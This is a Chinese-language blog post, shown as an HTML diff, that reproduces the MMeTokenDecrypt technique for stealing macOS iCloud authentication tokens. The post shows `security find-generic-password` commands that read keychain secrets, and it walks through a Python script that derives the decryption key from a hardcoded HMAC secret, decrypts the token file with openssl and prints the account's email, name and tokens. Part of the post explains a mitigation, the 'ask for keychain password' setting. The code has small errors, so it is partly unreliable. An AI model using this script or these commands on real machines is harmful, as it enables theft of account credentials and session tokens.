@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="iOS," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="MMeTokenDecrypt实践操作 本文实践操作基于MMeTokenDecrypt项目。 查看翻译请访问：MMeTokenDecrypt翻译 实践者： Chensh  前言背景在MacOS系统的深处，有一把神秘的小钥匙。这把密钥由44个随机字符组成，它的作用非常大。 有多大？它可以用来解开我们存储在系统里面的授权Token！ 我们都知道（未读原文前我根本就不知道，😆），在MacOS里，用户的">
+<meta name="keywords" content="iOS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MMeTokenDecrypt.py">
+<meta property="og:url" content="http://chensh.top/2017/07/08/MMeTokenDecrypt实践操作/index.html">
+<meta property="og:site_name" content="Forest Mist">
+<meta property="og:description" content="MMeTokenDecrypt实践操作 本文实践操作基于MMeTokenDecrypt项目。 查看翻译请访问：MMeTokenDecrypt翻译 实践者： Chensh  前言背景在MacOS系统的深处，有一把神秘的小钥匙。这把密钥由44个随机字符组成，它的作用非常大。 有多大？它可以用来解开我们存储在系统里面的授权Token！ 我们都知道（未读原文前我根本就不知道，😆），在MacOS里，用户的">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fhb0jtvyiqj31kw087400.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fhb0zu1parj30ok0badhp.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fhblsp9swej30zg0ngtd0.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fhblzkxuz7j30ty0jkgnl.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fhbm32ymorj30oe0b8tao.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/006tKfTcgy1fgpsk3r7b3j308c08c3ys.jpg">
+<meta property="og:updated_time" content="2017-09-29T03:12:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MMeTokenDecrypt.py">
+<meta name="twitter:description" content="MMeTokenDecrypt实践操作 本文实践操作基于MMeTokenDecrypt项目。 查看翻译请访问：MMeTokenDecrypt翻译 实践者： Chensh  前言背景在MacOS系统的深处，有一把神秘的小钥匙。这把密钥由44个随机字符组成，它的作用非常大。 有多大？它可以用来解开我们存储在系统里面的授权Token！ 我们都知道（未读原文前我根本就不知道，😆），在MacOS里，用户的">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fhb0jtvyiqj31kw087400.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chensh.top/2017/07/08/MMeTokenDecrypt实践操作/"/>
+
+
+
+
+
+  <title>MMeTokenDecrypt.py | Forest Mist</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Forest Mist</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">时は离れてるても、君の心は近くに感じる</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/07/08/MMeTokenDecrypt实践操作/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chensh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Forest Mist">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">MMeTokenDecrypt.py</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-08T08:10:53+08:00">
+                2017-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="MMeTokenDecrypt实践操作"><a href="#MMeTokenDecrypt实践操作" class="headerlink" title="MMeTokenDecrypt实践操作"></a>MMeTokenDecrypt实践操作</h1><ul>
+<li>本文实践操作基于<a href="https://github.com/manwhoami/MMeTokenDecrypt" target="_blank" rel="external">MMeTokenDecrypt</a>项目。</li>
+<li>查看翻译请访问：<a href="https://github.com/mail2chensh/OSG_Leaning/blob/master/002_MMeTokenDecrypt/MMeTokenDecrypt%E7%BF%BB%E8%AF%91.md" target="_blank" rel="external">MMeTokenDecrypt翻译</a></li>
+<li>实践者： Chensh</li>
+</ul>
+<h2 id="前言背景"><a href="#前言背景" class="headerlink" title="前言背景"></a>前言背景</h2><p>在MacOS系统的深处，有一把神秘的小钥匙。这把密钥由44个随机字符组成，它的作用非常大。</p>
+<p>有多大？它可以用来解开我们存储在系统里面的授权Token！</p>
+<p>我们都知道（未读原文前我根本就不知道，😆），在MacOS里，用户的授权Token都存储在<strong>/Users/*/Library/Application Support/iCloud/Accounts/</strong>这个目录下，以用户的<strong>iCloud账号</strong>（邮箱）为名的文件，其存储格式是<strong>DSID</strong>，这个文件是加密过的。</p>
+<p>那平常系统需要用到这个文件里面存储的token的时候，是如何解密的呢？</p>
+<p>这里涉及另外一个密钥，这个密钥存储在用户的<strong>keyChain</strong>里面，一个名为iCloud的条目。</p>
+<p>系统需要解密这个DSID文件时，就会从keyChain里面拿出解密密钥，进行<strong>base64编码</strong>，作为<strong>Hmac算法</strong>的<strong>消息体</strong>输入，然后和上面提到的神秘小钥匙进行了<strong>MD5加密</strong>，得到一把新的钥匙。</p>
+<p>而这个DSID文件，是采用128位AES的CBC加密模式加密的。CBC加密模式就是密码分组链接模式，这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥（也就是上面<strong>新</strong>产生的那把钥匙）进行加密。当然，这个过程还混合了一个空的初始化向量进行计算。</p>
+<p>所以，根据上文的分析，只要我们找到系统的神秘小钥匙和拿到keyChain里面iCloud的存储条目，那我们就可以尝试解密DSID这个文件，拿到用户的Token。</p>
+<p>而这里的神秘小钥匙已经被原文作者找到了并提供出来，作者在原文里主要阐述的是<strong>keyChain里面存在的bug，导致解密密钥容易被泄露</strong>。</p>
+<p>那么接下来，我们就开始复现作者的思路。</p>
+<h2 id="keyChain的不安全性"><a href="#keyChain的不安全性" class="headerlink" title="keyChain的不安全性"></a>keyChain的不安全性</h2><p>本来keychain作为用户存储密码的载体，应该是做到很安全的，但这里有一个原文作者认为的bug，恶意用户可以根据这个bug来绕过钥匙串密码从而拿到keychain里面存储的条目。当然，这个绕过方式是有条件的，以下分别介绍两种情况。</p>
+<h4 id="当用户没有设防"><a href="#当用户没有设防" class="headerlink" title="当用户没有设防"></a>当用户没有设防</h4><p>我们首先打开keychain应用(Spotlight里面输入Keychain Access进行搜索)。</p>
+<p>然后在左侧<strong>种类</strong>栏目<strong>密码</strong>一项进行选中，右侧就会出现存储在本机上的所有安全信息存储。这里进行筛选，找到我们的试验目标：<strong>Chrome Safe Storage</strong>。这个条目存储了谷歌Chrome浏览器的安全存储信息解密密钥。</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fhb0jtvyiqj31kw087400.jpg" alt=""></p>
+<p>那要如何拿到这个解密密钥呢？上文我们已经提及到了，这里打开命令行。输入以下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> security find-generic-password -ga 'Chrome'</div></pre></td></tr></table></figure>
+<p>这里使用到了 security命令，它是非常强大命令行安全工具，之前我们<a href="http://chensh.top/2017/06/30/Patching-and-ReSigning-iOS-Apps/">重签</a>的那篇文章里面也使用到了这个命令去查找有效的证书。</p>
+<p>这里的参数解释如下：</p>
+<ul>
+<li><strong>find-generic-password</strong> 命令参数，是使用“查找密码”的功能。</li>
+<li><strong>-a</strong>，这个参数是匹配类型为“账户”的，用于过滤。</li>
+<li><strong>-g</strong>，这个参数是将查询到的密码显示出来。</li>
+</ul>
+<p>运行这个命令后，系统马上就会弹出一个提示框，如下：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fhb0zu1parj30ok0badhp.jpg" alt=""></p>
+<p>那么到这里，只要用户点击了“允许”按钮，那么就可以马上得到存储在keychain里面的密钥了。如下：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fhblsp9swej30zg0ngtd0.jpg" alt=""></p>
+<p>这里security请求钥匙串访问的权限，用户点击“允许”后，就能读取到相应的password。</p>
+<p>假如有人未经你允许擅动你电脑，这个时候就可以轻而易举的窃取了你密码。</p>
+<p>当然，如果是远程的恶意黑客，那么有可能会无限次弹出弹窗提示，直至逼到你点击“允许”按钮为止。</p>
+<p>那我们该如何防范这种情况呢？请往下看。</p>
+<h4 id="当用户开启了“询问钥匙串密码”选项"><a href="#当用户开启了“询问钥匙串密码”选项" class="headerlink" title="当用户开启了“询问钥匙串密码”选项"></a>当用户开启了“询问钥匙串密码”选项</h4><p>我们回到刚刚keychain 里面那个chrome safe storage的条目，右键选择<strong>显示简介</strong>。</p>
+<p>切换到<strong>访问控制</strong>的面板，将<strong>询问钥匙串密码</strong>选中。</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fhblzkxuz7j30ty0jkgnl.jpg" alt=""></p>
+<p>这里有另外一个小bug，就是keychain里面的更改需要重复两次操作，才能真正的修改成功，当我们勾选了这个选项，切换到<em>属性</em>然后再切换回来的时候，发现这个选项又没有被选中，需要再重复操作一遍才行。</p>
+<p>然后我们回到命令行，重新输入上面security的命令，这一次我们发现弹窗出来不一样了。这里需要我们输入钥匙串密码。</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fhbm32ymorj30oe0b8tao.jpg" alt=""></p>
+<p>所以当我们开启了这个选项，就算别人偷偷用你的电脑，没有你的钥匙串密码，也无法得到其中的安全信息。这里就多了一道防护。</p>
+<p>以上的操作步骤，我们主要对是否开启钥匙串密码的安全性做一点讨论。接下来我们要使用脚本来自动获取密码，并且结合系统的神秘小钥匙，用来解密我们iCloud条目里面的Token。</p>
+<h2 id="MMeToenDecrypt-py-解析"><a href="#MMeToenDecrypt-py-解析" class="headerlink" title="MMeToenDecrypt.py 解析"></a>MMeToenDecrypt.py 解析</h2><p>先引入所需要的库。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64, hashlib, hmac, subprocess, sys, glob, os, binasicc</div><div class="line"><span class="keyword">from</span> Foundation <span class="keyword">import</span> NSData, NSPropertyListSerialization</div></pre></td></tr></table></figure>
+<ul>
+<li>base64用来加密iCloud的钥匙。</li>
+<li>hashlib用于计算md5</li>
+<li>subprocess用于fork一个子进程，并运行一个外部程序。</li>
+</ul>
+<p>按照上面的方法，使用security命令获取iCloud条目的密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">security find-generic-password -ws 'iCloud'</div></pre></td></tr></table></figure>
+<ul>
+<li>-w 参数是用于仅显示密码项。</li>
+<li>-s 参数是用于指定类型为server的条目，并匹配后面的关键词。</li>
+</ul>
+<p>在python里面，我们可以是subprocess库来运行外部程序，将shell环境下命令运行的结果返回到本程序。如果没有获取到，则打印报错信息，再退出程序。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">iCloudKey = subprocess.check_output(<span class="string">"security find-generic-password -ws 'iCloud' | awk &#123;'print $1'&#125;"</span>, shell=<span class="keyword">True</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</div><div class="line"><span class="keyword">if</span> iCloudKey == <span class="string">""</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Error getting iCloud Decryption Key"</span></div><div class="line">    sys.exit()</div></pre></td></tr></table></figure>
+<p>得到iCloud的密码后，我们将其进行base64编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg = base64.b64decode(iCloudKey)</div></pre></td></tr></table></figure>
+<p>接下来上场的是我们那把神秘的小钥匙了。</p>
+<p>它在所有的Macos版本里面都用于生成Hmac哈希。它是用于解密的关键。</p>
+<p>在位于<strong>/System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit</strong>路径下的系统库，执行了下面的方法，调用了CCHmac来生成一个Hmac，用于解密秘钥。</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="type">KeychainAccountStorage</span> _generateKeyFromData:</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">"t9s\"lx^awe.580Gj%'ld+0LG&lt;#9xa?&gt;vb)-fkwb92[&#125;"</span></div></pre></td></tr></table></figure>
+<p>将上面得到的iCloudKey和系统神秘钥匙使用hmac进行md5计算。</p>
+<p>并将我们得到的哈希值进行16进制转换。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()</div><div class="line">hexedKey = binascii.hexlify(hashed)</div></pre></td></tr></table></figure>
+<p>我们知道用户的授权Token都存放在<strong>~/Library/Application Support/iCloud/Accounts/</strong> 下，所以要遍历一下该文件夹下面的文件，判断是否为我们所需要的DSID文件(纯数字文件名)。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mmeTokenFile = glob.glob(<span class="string">"%s/Library/Application Support/iCloud/Account/*"</span> % os.path.expanduser(<span class="string">"~"</span>))</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> mmeTokenFile:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        int(x.split(<span class="string">"/"</span>)[<span class="number">-1</span>])</div><div class="line">        mmeTokenFile = x</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> isinstance(mmeTokenFile, str):</div><div class="line">    <span class="keyword">print</span><span class="string">"Could not find MMeTokenFile. You can specify the file manually"</span></div><div class="line">  	sys.exit()</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Decrypting token plist -&gt; [%s]\n"</span> % mmeTokenFile</div></pre></td></tr></table></figure>
+<p>接下来我们使用openssl这个命令行工具，将一个空的初始化向量IV和上面已经被16进制转换的密钥，以及我们找到DSID文件，进行128位的AES解密。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">decryptedBinary = subprocess.check_output(<span class="string">"openssl enc -d -aes-128-cbc -iv '%s' -K %s &lt; '%s'"</span> % (IV, hexedKey, mmeTokenFile), shell=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
+<p>这里得到的decryptedBinary是解密出来的二进制数据，我们使用Foundation库里面的类来将它转化为可读取的plist格式。</p>
+<p>然后遍历这个plist格式对象，将其中的内容打印出来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">binToPlist = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))</div><div class="line"></div><div class="line">tokenPlist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, <span class="number">0</span>, <span class="keyword">None</span>, <span class="keyword">None</span>)[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Successfully decrypted token plist!\n"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"%s [%s -&gt; %s]"</span> % (tokenPlist[<span class="string">"appleAccountInfo"</span>][<span class="string">"primaryEmail"</span>], tokenPlist[<span class="string">"appleAccountInfo"</span>][<span class="string">"fullName"</span>], tokenPlist[<span class="string">"appleAccountInfo"</span>][<span class="string">"dsPrsID"</span>])</div><div class="line"><span class="keyword">print</span> tokenPlist[<span class="string">"tokens"</span>]</div></pre></td></tr></table></figure>
+<p>至此，我们的重现步骤到此结束，整个流程下来你可以发现，只要用户不小心点击了“允许”按钮，我们就很容易的窃取到了iCloud里面的Token。</p>
+<p>你可以尝试在自己的机子上运行这份代码，假如能够打印出来相关的iCloud账号Token，那就说明你成功重现了。</p>
+<p><img src="https://ww1.sinaimg.cn/large/006tKfTcgy1fgpsk3r7b3j308c08c3ys.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/iOS/" rel="tag"># iOS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/04/MMeTokenDecrypt/" rel="next" title="MMeTokenDecrypt">
+                <i class="fa fa-chevron-left"></i> MMeTokenDecrypt
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/06/IDA-Plugin-FRIEND/" rel="prev" title="IDA Plugin: FRIEND">
+                IDA Plugin: FRIEND <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Chensh" />
+          <p class="site-author-name" itemprop="name">Chensh</p>
+           
+              <p class="site-description motion-element" itemprop="description">举眉间仲夏，绿荫里蝉鸣</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">Artikel</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">Tags</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MMeTokenDecrypt实践操作"><span class="nav-number">1.</span> <span class="nav-text">MMeTokenDecrypt实践操作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言背景"><span class="nav-number">1.1.</span> <span class="nav-text">前言背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#keyChain的不安全性"><span class="nav-number">1.2.</span> <span class="nav-text">keyChain的不安全性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#当用户没有设防"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">当用户没有设防</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#当用户开启了“询问钥匙串密码”选项"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">当用户开启了“询问钥匙串密码”选项</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MMeToenDecrypt-py-解析"><span class="nav-number">1.3.</span> <span class="nav-text">MMeToenDecrypt.py 解析</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chensh</span>
+</div>
+
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
